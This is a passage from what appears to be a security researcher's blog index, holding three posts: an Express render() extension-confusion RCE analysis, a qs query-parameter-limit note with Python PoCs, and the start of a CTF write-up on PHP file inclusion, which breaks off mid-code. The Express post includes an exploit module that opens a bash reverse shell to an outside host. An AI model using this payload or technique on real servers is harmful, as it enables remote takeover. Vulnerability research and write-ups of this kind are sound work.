merge(renderOptions, opts._locals);  }  // merge options  merge(renderOptions, opts);  // set .cache unless explicitly provided  if (renderOptions.cache == null) {    renderOptions.cache = this.enabled('view cache');  }  // primed cache  if (renderOptions.cache) {    view = cache[name];  }  // view  if (!view) {    var View = this.get('view');    view = new View(name, {      defaultEngine: this.get('view engine'),      root: this.get('views'),      engines: engines    });    if (!view.path) {      var dirs = Array.isArray(view.root) &amp;&amp; view.root.length &gt; 1        ? 'directories \"' + view.root.slice(0, -1).join('\", \"') + '\" or \"' + view.root[view.root.length - 1] + '\"'        : 'directory \"' + view.root + '\"'      var err = new Error('Failed to lookup view \"' + name + '\" in views ' + dirs);      err.view = view;      return done(err);    }    // prime the cache    if (renderOptions.cache) {      cache[name] = view;    }  }  // render  tryRender(view, renderOptions, done);};The render() function calls View function if the view variable is empty. And when the function ends, it calls tryRender() function./lib/view.js#L52L95/*var path = require('path');var extname = path.extname;*/function View(name, options) {  var opts = options || {};  this.defaultEngine = opts.defaultEngine;  this.ext = extname(name);  this.name = name;  this.root = opts.root;  if (!this.ext &amp;&amp; !this.defaultEngine) {    throw new Error('No default engine was specified and no extension was provided.');  }  var fileName = name;  if (!this.ext) {    // get extension from default engine name    this.ext = this.defaultEngine[0] !== '.'      ? '.' + this.defaultEngine      : this.defaultEngine;    fileName += this.ext;  }  if (!opts.engines[this.ext]) {    // load engine    var mod = this.ext.slice(1)    debug('require \"%s\"', mod)    // default engine export    var fn = require(mod).__express    if (typeof fn !== 'function') {      throw new Error('Module \"' + mod + '\" does not provide a view engine.')    }    opts.engines[this.ext] = fn  }  // store loaded engine  this.engine = opts.engines[this.ext];  // lookup path  this.path = this.lookup(fileName);}The View() function makes an anonymous function. In some if statement, if the !opts.engines[this.ext] property is empty, after cutting the first letter from the value of this.ext, the value is used to call the require() function. At this time, the function code called __express in the JavaScript file is imported and defined in opts.engines[this.ext]. Then, define the value of opts.engines[this.ext] in this.engine variable. That is, the this.engine variable contains the __express function.This is where the root cause of this vulnerability occurs. After parsing the extension using path.extname(), it does not check the extension. That’s all./lib/application.js#L655L661function tryRender(view, options, callback) {  try {    view.render(options, callback);  } catch (err) {    callback(err);  }}In the render() function, call the tryRender() function after calling the View() function. The tryRender() function calls the View.prototype.render() function/lib/view.js#L133L136View.prototype.render = function render(options, callback) {  debug('render \"%s\"', this.path);  this.engine(this.path, options, callback);};Lastly, in the View.prototype.render() function, the anonymous function this.engine() function is executed.How to trigger an RCECode for Testingconst express = require('express')const app = express()const port = 3000app.set('view engine', 'ejs');app.get('/', (req,res) =&gt; {    const page = req.query.filename    res.render(page);})app.listen(port, () =&gt; {  console.log(`Listening on port ${port}`)});The test code is as above.Check ejs extension management logic![https://media.discordapp.net/attachments/1049498153801502740/1053999809608044574/2022-12-18_20.38.48.png?width=1550&amp;height=977]  http://localhost:3000/?filename=test  http://localhost:3000/?filename=test.ejsI checked how the extension is managed in the logic that handles the extension of the file passed to the render() function. When I pass files like render(‘test’), render(‘test.ejs’), all extensions are ejs .  http://localhost:3000/?filename=rce.pocasHowever, when the render() function is called like render(‘rce.pocas’), “pocas”, not “ejs”, is included in the extension. Since the engine type was set to “ejs” using app.set() in express, the extension should be ejs in any case, but an arbitrary extension can be inserted because there is no exception handling.var mod = this.ext.slice(1)debug('require \"%s\"', mod)// default engine exportvar fn = require(mod).__expressThat is, I can manipulate the extension and call the JavaScript library I want through the code above! Through the above function, get the __express function of the desired file, put it in this.engine variable, and execute this.engine() in view.prototype.render() function. If a hacker can upload a desired file under node_modules using the file upload function, the desired function code can be inserted into this.engine variable and executed.Exploitexports.__express = function() {    console.log(require('child_process').execSync(\"id\").toString());    require('child_process').execSync(\"bash -c 'bash -i &gt;&amp; /dev/tcp/pocas.kr/9999 0&gt;&amp;1'\");}For the test, a module called pocas was created under node_modules.  http://localhost:3000/?filename=rce.pocasAs shown above, you can see that RCE is triggered by calling an arbitrary library using the extension confusing.MitigationThe reason why the vulnerability occurs is that the file extension is parsed using the path.extname() function and the extension is not checked. Since the file extension is not checked, other arbitrary modules other than the ejs module can be called. So add file extension checking logic.:Recommendation: compare whether the extension obtained through extname() and the extension of the server’s default template are the same"
  },
  
  {
    "title": "Express, Querystring parameter limit of req.query",
    "url": "/posts/Logic-req.query/",
    "categories": "",
    "tags": "",
    "date": "2022-11-20 06:41:53 +0900",
    





    
    "snippet": "Summaryfew days ago, i found an interesting logic in req.query() and call the qs module inside req.query(). the qs module limits a number of parameter and default limit number is 1000.so if we send...",
    "content": "Summaryfew days ago, i found an interesting logic in req.query() and call the qs module inside req.query(). the qs module limits a number of parameter and default limit number is 1000.so if we send more than 1000 parameters, server will not read any more after the 1000th parameter.Analysis/*! * express * Copyright(c) 2009-2013 TJ Holowaychuk * Copyright(c) 2013 Roman Shtylman * Copyright(c) 2014-2015 Douglas Christopher Wilson * MIT Licensed */'use strict';/** * Module dependencies. */var merge = require('utils-merge')var parseUrl = require('parseurl');var qs = require('qs');/** * @param {Object} options * @return {Function} * @api public */module.exports = function query(options) {  var opts = merge({}, options)  var queryparse = qs.parse;  if (typeof options === 'function') {    queryparse = options;    opts = undefined;  }  if (opts !== undefined &amp;&amp; opts.allowPrototypes === undefined) {    // back-compat for qs module    opts.allowPrototypes = true;  }  return function query(req, res, next){    if (!req.query) {      var val = parseUrl(req).query;      req.query = queryparse(val, opts);    }    next();  };};// express/lib/middlewere/query.jsreq.query() method calls qs.parse() method. The arguments of qs.parse() method is val, opts. Val is the value that parseUrl() method parse the value we sent.module.exports = function (str, opts) {    var options = normalizeParseOptions(opts);    if (str === '' || str === null || typeof str === 'undefined') {        return options.plainObjects ? Object.create(null) : {};    }    var tempObj = typeof str === 'string' ? parseValues(str, options) : str;    var obj = options.plainObjects ? Object.create(null) : {};    // Iterate over the keys and setup the new object    var keys = Object.keys(tempObj);    for (var i = 0; i &lt; keys.length; ++i) {        var key = keys[i];        var newObj = parseKeys(key, tempObj[key], options, typeof str === 'string');        obj = utils.merge(obj, newObj, options);    }    if (options.allowSparse === true) {        return obj;    }    return utils.compact(obj);};// qs/lib/parse.js#L239L263and qs.parse() method calls parseValues() function inside.var parseValues = function parseQueryStringValues(str, options) {    var obj = {};    var cleanStr = options.ignoreQueryPrefix ? str.replace(/^\\?/, '') : str;    var limit = options.parameterLimit === Infinity ? undefined : options.parameterLimit;    var parts = cleanStr.split(options.delimiter, limit);    var skipIndex = -1; // Keep track of where the utf8 sentinel was found    var i;    var charset = options.charset;    if (options.charsetSentinel) {        for (i = 0; i &lt; parts.length; ++i) {            if (parts[i].indexOf('utf8=') === 0) {                if (parts[i] === charsetSentinel) {                    charset = 'utf-8';                } else if (parts[i] === isoSentinel) {                    charset = 'iso-8859-1';                }                skipIndex = i;                i = parts.length; // The eslint settings do not allow break;            }        }    }    for (i = 0; i &lt; parts.length; ++i) {    ...    ...    ...    ...    ...    ...// qs/lib/parse.js#L51L74if you see the parseValues() function, you can see a value called options.parameterLimit. the limit variable is used in cleanStr.split(options.delimiter, limit). in here, cleanStr is the query string we sent. So it means parsing only 1000 query strings.const app = require('express')()app.get('/', (req, res) =&gt; {    res.send(req.query)})app.listen(8000)i wrote a code of express server for testing.import requestsurl = \"http://localhost:8000/?a=a\" + \"&amp;a=a\"*999 + \"&amp;pocas=1\"print(requests.get(url).text)'''❯ python3 poc.py        {\"a\":[\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\"]}'''i wrote a PoC that passes over 1000 parameters. as a result of executing the PoC, the parameters up to the 1000th are output, but the pocas parameters of the 1001st are not outputimport requestsurl = \"http://localhost:8000/?a=a\" + \"&amp;a=a\"*998 + \"&amp;pocas=1\"print(requests.get(url).text)'''❯ python3 poc.py{\"a\":[\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\",\"a\"],\"pocas\":\"1\"}'''the code above is a PoC that sends 1000 query strings including the pocas parameter. looking at the result, the number of parameters does not exceed 1000, so even pocas are parsed well.this logic is not important. i just wrote for using it someday"
  },
  
  {
    "title": "CCE 2022 Write Up",
    "url": "/posts/CCE/",
    "categories": "",
    "tags": "",
    "date": "2022-09-25 13:00:53 +0900",
    





    
    "snippet": "After a long time I did ctf again. Actually, a few days ago, 김지섭님, a member of zer0pt, asked me to do CCE together, but I refused. The reason was because of work.But I was able to find 5 XSS from *...",
    "content": "After a long time I did ctf again. Actually, a few days ago, 김지섭님, a member of zer0pt, asked me to do CCE together, but I refused. The reason was because of work.But I was able to find 5 XSS from ** by concentrating on my work. And maybe if i was with him, it would have been the first and last CCE general finals of my life XDreborn of phpThe reborn of php is challenge that triggers RCE via file upload. And the flag location is /flag&lt;?php if(!defined('__MAIN__')) exit; ?&gt;&lt;?php    class Controller {        private $board = '';        private $action = '';        function __construct($board, $action) {            $this-&gt;board = $board;            $this-&gt;action = $action;            if(!preg_match('/^[a-z0-9:.]+$/i', $this-&gt;board)){                $this-&gt;board = 'main';                $this-&gt;action = 'index';           }        }               function process() {            $path = \"{$this-&gt;board}/{$this-&gt;action}\";                        if(preg_match('/php|html/i',  $path)){                alert('not invalid', 'back');            }                       chdir('pages/');            if(!file_exists(\"{$path}.php\")) $path = 'main/index';            include(\"{$path}.php\");       }         }    // /var/www/html/lib/controller.lib.php?&gt;&lt;?php    define('__MAIN__', true);    include('lib/controller.lib.php');    include('lib/util.lib.php');            $board = $_GET['b'] ? $_GET['b'] : 'main' ;    $action = $_GET['a'] ? $_GET['a'] : 'index';       $controller = new Controller($board, $action);    $controller-&gt;process();        // /var/www/html/index.php?&gt;This is code of index.php and controller.lib.php. In the index.php, It takes parameters and passes them to the Controller constructor. An LFI vulnerability exists in the process() method of Controller. If we can create arbitrary php files on the server we can trigger RCE.    function save_user_id($id, $pw){        chdir('../');        file_put_contents(\"dbs/{$id}\", serialize($pw));    }    // /var/www/html/lib/util.lib.phpA vulnerability exists in the save_user_id() function that can create arbitrary files. Also, this function is fired when registering as a member. And the file creation path is under /var/www/html/dbs/&lt;?php if(!defined('__MAIN__')) die('Access denied'); ?&gt;&lt;?php    $id = $_POST['id'];    $pw = 